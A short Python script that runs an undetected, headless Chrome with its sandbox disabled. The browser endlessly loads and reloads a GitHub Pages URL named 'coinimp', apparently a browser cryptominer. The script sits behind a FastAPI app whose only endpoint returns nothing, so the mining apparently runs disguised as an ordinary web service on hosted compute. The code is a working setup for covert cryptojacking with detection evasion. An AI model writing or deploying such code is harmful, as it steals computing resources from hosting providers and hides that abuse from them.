from threading import Thread
from fastapi import FastAPI

def run():
    from undetected_chromedriver import Chrome, ChromeOptions
    from requests import get
    from time import sleep
    
    options = ChromeOptions()
    options.add_argument(f"--user-data-dir=C:/Users/admin/Downloads/proxy/chrome")
    options.add_argument("--no-first-run")
    options.add_argument("--no-service-autorun")
    options.add_argument("--password-store=basic")
    options.add_argument("--disable-extensions")
    options.add_argument("--disable-popup-blocking")
    options.add_argument("--disable-gpu")
    options.add_argument("--disable-software-rasterizer")
    options.add_argument("--headless=new")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-setuid-sandbox")
    options.add_argument("--lang=vi")
    options.add_argument("--log-level=3")
    
    url = 'https://23110089.github.io/coinimp/'
    while True:
        try:
            driver = Chrome(options=options, headless=False, use_subprocess=True)
            dl = get(url).text; driver.get(url)
            while True:
                print(driver.title); sleep(30)
                if dl != get(url).text:
                    print("Page content changed, reloading...")
                    dl = get(url).text; driver.get(url)
        except Exception as e:
            print(f"Error: {e}"); sleep(5)
Thread(target=run).start()

app = FastAPI()

@app.get("/")
def home(): return
